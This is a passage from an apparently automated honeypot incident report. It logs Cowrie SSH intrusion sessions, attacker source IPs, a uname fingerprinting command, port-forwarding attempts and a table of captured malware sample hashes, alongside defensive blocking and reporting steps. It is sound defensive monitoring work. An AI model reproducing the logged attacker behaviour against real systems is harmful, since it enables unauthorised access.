- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88d79912c747

| Field | Detail |
|---|---|
| **Source IP** | `164.52.105[.]37` |
| **First Seen** | 2026-09-03 12:27 |
| **Last Seen** | 2026-09-03 12:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:27:49` | `cowrie.session.connect` |
| `2026-09-03 12:27:49` | `cowrie.client.version` |
| `2026-09-03 12:27:49` | `cowrie.client.kex` |
| `2026-09-03 12:27:51` | `cowrie.login.success` |
| `2026-09-03 12:27:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.52.105[.]37` to AbuseIPDB if not already reported
- [ ] Block `164.52.105[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a501f49a6d0

| Field | Detail |
|---|---|
| **Source IP** | `164.52.105[.]37` |
| **First Seen** | 2026-09-03 12:27 |
| **Last Seen** | 2026-09-03 12:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:27:51` | `cowrie.session.connect` |
| `2026-09-03 12:27:51` | `cowrie.client.version` |
| `2026-09-03 12:27:51` | `cowrie.client.kex` |
| `2026-09-03 12:27:53` | `cowrie.login.success` |
| `2026-09-03 12:27:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.52.105[.]37` to AbuseIPDB if not already reported
- [ ] Block `164.52.105[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71b5d671fbfc

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:27 |
| **Last Seen** | 2026-09-03 12:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:27:58` | `cowrie.session.connect` |
| `2026-09-03 12:27:58` | `cowrie.client.version` |
| `2026-09-03 12:27:58` | `cowrie.client.kex` |
| `2026-09-03 12:27:58` | `cowrie.login.success` |
| `2026-09-03 12:27:59` | `cowrie.session.params` |
| `2026-09-03 12:27:59` | `cowrie.command.input` |
| `2026-09-03 12:27:59` | `cowrie.log.closed` |
| `2026-09-03 12:27:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30a1fa24cbf2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 12:29 |
| **Last Seen** | 2026-09-03 12:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:29:32` | `cowrie.session.connect` |
| `2026-09-03 12:29:32` | `cowrie.client.version` |
| `2026-09-03 12:29:33` | `cowrie.client.kex` |
| `2026-09-03 12:29:34` | `cowrie.login.success` |
| `2026-09-03 12:29:34` | `cowrie.direct-tcpip.request` |
| `2026-09-03 12:29:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 12:29:34` | `cowrie.direct-tcpip.data` |
| `2026-09-03 12:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8380142003aa

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:29 |
| **Last Seen** | 2026-09-03 12:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:29:37` | `cowrie.session.connect` |
| `2026-09-03 12:29:37` | `cowrie.client.version` |
| `2026-09-03 12:29:37` | `cowrie.client.kex` |
| `2026-09-03 12:29:37` | `cowrie.login.success` |
| `2026-09-03 12:29:38` | `cowrie.session.params` |
| `2026-09-03 12:29:38` | `cowrie.command.input` |
| `2026-09-03 12:29:38` | `cowrie.log.closed` |
| `2026-09-03 12:29:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d74b901d131f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:31 |
| **Last Seen** | 2026-09-03 12:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:31:12` | `cowrie.session.connect` |
| `2026-09-03 12:31:12` | `cowrie.client.version` |
| `2026-09-03 12:31:12` | `cowrie.client.kex` |
| `2026-09-03 12:31:12` | `cowrie.login.success` |
| `2026-09-03 12:31:13` | `cowrie.session.params` |
| `2026-09-03 12:31:13` | `cowrie.command.input` |
| `2026-09-03 12:31:13` | `cowrie.log.closed` |
| `2026-09-03 12:31:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-819c2d75fb0e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:32 |
| **Last Seen** | 2026-09-03 12:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:32:51` | `cowrie.session.connect` |
| `2026-09-03 12:32:51` | `cowrie.client.version` |
| `2026-09-03 12:32:51` | `cowrie.client.kex` |
| `2026-09-03 12:32:51` | `cowrie.login.success` |
| `2026-09-03 12:32:52` | `cowrie.session.params` |
| `2026-09-03 12:32:52` | `cowrie.command.input` |
| `2026-09-03 12:32:52` | `cowrie.log.closed` |
| `2026-09-03 12:32:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9028d0396a02

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:34 |
| **Last Seen** | 2026-09-03 12:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:34:30` | `cowrie.session.connect` |
| `2026-09-03 12:34:30` | `cowrie.client.version` |
| `2026-09-03 12:34:30` | `cowrie.client.kex` |
| `2026-09-03 12:34:31` | `cowrie.login.success` |
| `2026-09-03 12:34:32` | `cowrie.session.params` |
| `2026-09-03 12:34:32` | `cowrie.command.input` |
| `2026-09-03 12:34:32` | `cowrie.log.closed` |
| `2026-09-03 12:34:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f69adffae13

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 12:34 |
| **Last Seen** | 2026-09-03 12:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:34:55` | `cowrie.session.connect` |
| `2026-09-03 12:34:55` | `cowrie.client.version` |
| `2026-09-03 12:34:55` | `cowrie.client.kex` |
| `2026-09-03 12:34:56` | `cowrie.login.success` |
| `2026-09-03 12:34:56` | `cowrie.direct-tcpip.request` |
| `2026-09-03 12:34:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 12:34:56` | `cowrie.direct-tcpip.data` |
| `2026-09-03 12:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9019c32275e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:36 |
| **Last Seen** | 2026-09-03 12:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:36:08` | `cowrie.session.connect` |
| `2026-09-03 12:36:08` | `cowrie.client.version` |
| `2026-09-03 12:36:09` | `cowrie.client.kex` |
| `2026-09-03 12:36:09` | `cowrie.login.success` |
| `2026-09-03 12:36:10` | `cowrie.session.params` |
| `2026-09-03 12:36:10` | `cowrie.command.input` |
| `2026-09-03 12:36:10` | `cowrie.log.closed` |
| `2026-09-03 12:36:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecf2773b305a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 12:39 |
| **Last Seen** | 2026-09-03 12:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:39:13` | `cowrie.session.connect` |
| `2026-09-03 12:39:13` | `cowrie.client.version` |
| `2026-09-03 12:39:13` | `cowrie.client.kex` |
| `2026-09-03 12:39:14` | `cowrie.login.success` |
| `2026-09-03 12:39:14` | `cowrie.direct-tcpip.request` |
| `2026-09-03 12:39:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 12:39:14` | `cowrie.direct-tcpip.data` |
| `2026-09-03 12:39:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21649dd649c3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 12:45 |
| **Last Seen** | 2026-09-03 12:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:45:33` | `cowrie.session.connect` |
| `2026-09-03 12:45:33` | `cowrie.client.version` |
| `2026-09-03 12:45:33` | `cowrie.client.kex` |
| `2026-09-03 12:45:34` | `cowrie.login.success` |
| `2026-09-03 12:45:34` | `cowrie.direct-tcpip.request` |
| `2026-09-03 12:45:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 12:45:34` | `cowrie.direct-tcpip.data` |
| `2026-09-03 12:45:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d37d324d0dc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 12:48 |
| **Last Seen** | 2026-09-03 12:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:48:33` | `cowrie.session.connect` |
| `2026-09-03 12:48:33` | `cowrie.client.version` |
| `2026-09-03 12:48:34` | `cowrie.client.kex` |
| `2026-09-03 12:48:35` | `cowrie.login.success` |
| `2026-09-03 12:48:35` | `cowrie.direct-tcpip.request` |
| `2026-09-03 12:48:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 12:48:36` | `cowrie.direct-tcpip.data` |
| `2026-09-03 12:48:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `45.33.50[.]24` | **120** | 2026-09-03 11:48 | 2026-09-03 11:56 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `207.175.153[.]57` | **29** | 2026-09-03 07:54 | 2026-09-03 07:55 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `34.53.161[.]246` | **29** | 2026-09-03 08:38 | 2026-09-03 08:38 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `34.62.24[.]95` | **29** | 2026-09-03 07:02 | 2026-09-03 07:02 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `35.241.150[.]194` | **8** | 2026-09-03 07:44 | 2026-09-03 07:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.131.166[.]106` | **7** | 2026-09-03 09:19 | 2026-09-03 09:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `118.193.59[.]4` | **3** | 2026-09-03 07:29 | 2026-09-03 07:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `170.253.35[.]26` | **3** | 2026-09-03 12:10 | 2026-09-03 12:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.90.12[.]122` | **3** | 2026-09-03 12:09 | 2026-09-03 12:20 | 4m | 0 | `T1592` | 🟢 LOW |
| `194.67.59[.]27` | **3** | 2026-09-03 11:43 | 2026-09-03 11:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `108.244.80[.]43` | **2** | 2026-09-03 09:04 | 2026-09-03 09:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.99.6[.]50` | **2** | 2026-09-03 12:04 | 2026-09-03 12:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.42.98[.]163` | **2** | 2026-09-03 09:49 | 2026-09-03 09:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `222.223.177[.]118` | **2** | 2026-09-03 10:59 | 2026-09-03 11:01 | 2m | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | **2** | 2026-09-03 11:34 | 2026-09-03 11:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.98.62[.]130` | **2** | 2026-09-03 06:57 | 2026-09-03 06:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | **2** | 2026-09-03 11:50 | 2026-09-03 12:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `113.211.215[.]241` | 1 | 2026-09-03 12:42 | 2026-09-03 12:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `116.255.159[.]152` | 1 | 2026-09-03 08:02 | 2026-09-03 08:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.56.11[.]51` | 1 | 2026-09-03 11:25 | 2026-09-03 11:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.91.33[.]72` | 1 | 2026-09-03 07:58 | 2026-09-03 08:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.198.29[.]172` | 1 | 2026-09-03 10:27 | 2026-09-03 10:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.116.189[.]74` | 1 | 2026-09-03 10:29 | 2026-09-03 10:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `165.154.225[.]20` | 1 | 2026-09-03 10:48 | 2026-09-03 10:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.170.144[.]19` | 1 | 2026-09-03 12:31 | 2026-09-03 12:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `179.43.107[.]126` | 1 | 2026-09-03 09:38 | 2026-09-03 09:38 | 11s | 0 | `T1592` | 🟢 LOW |
| `185.216.145[.]173` | 1 | 2026-09-03 12:44 | 2026-09-03 12:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]54` | 1 | 2026-09-03 12:33 | 2026-09-03 12:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.99.5[.]134` | 1 | 2026-09-03 10:17 | 2026-09-03 10:17 | 12s | 0 | `T1592` | 🟢 LOW |
| `193.176.29[.]10` | 1 | 2026-09-03 12:33 | 2026-09-03 12:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-09-03 10:03 | 2026-09-03 10:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.44.132[.]162` | 1 | 2026-09-03 10:45 | 2026-09-03 10:46 | 13s | 0 | `T1592` | 🟢 LOW |
| `195.222.59[.]154` | 1 | 2026-09-03 08:01 | 2026-09-03 08:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `199.45.154[.]67` | 1 | 2026-09-03 10:52 | 2026-09-03 10:52 | 15s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-09-03 11:38 | 2026-09-03 11:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.112.142[.]183` | 1 | 2026-09-03 06:59 | 2026-09-03 06:59 | 10s | 0 | `T1592` | 🟢 LOW |
| `200.59.122[.]4` | 1 | 2026-09-03 09:08 | 2026-09-03 09:08 | 11s | 0 | `T1592` | 🟢 LOW |
| `209.99.186[.]128` | 1 | 2026-09-03 08:07 | 2026-09-03 08:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `217.24.168[.]208` | 1 | 2026-09-03 10:16 | 2026-09-03 10:16 | 13s | 0 | `T1592` | 🟢 LOW |
| `31.148.206[.]199` | 1 | 2026-09-03 09:47 | 2026-09-03 09:48 | 15s | 0 | `T1592` | 🟢 LOW |
| `35.205.247[.]108` | 1 | 2026-09-03 07:44 | 2026-09-03 07:44 | 4s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]59` | 1 | 2026-09-03 12:35 | 2026-09-03 12:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.116.26[.]161` | 1 | 2026-09-03 08:36 | 2026-09-03 08:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.56.200[.]238` | 1 | 2026-09-03 09:07 | 2026-09-03 09:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]122` | 1 | 2026-09-03 08:28 | 2026-09-03 08:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-09-03 07:39 | 2026-09-03 07:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `79.1.85[.]100` | 1 | 2026-09-03 11:04 | 2026-09-03 11:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]179` | 1 | 2026-09-03 12:44 | 2026-09-03 12:44 | 10s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]77` | 1 | 2026-09-03 10:18 | 2026-09-03 10:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]73` | 1 | 2026-09-03 09:26 | 2026-09-03 09:26 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
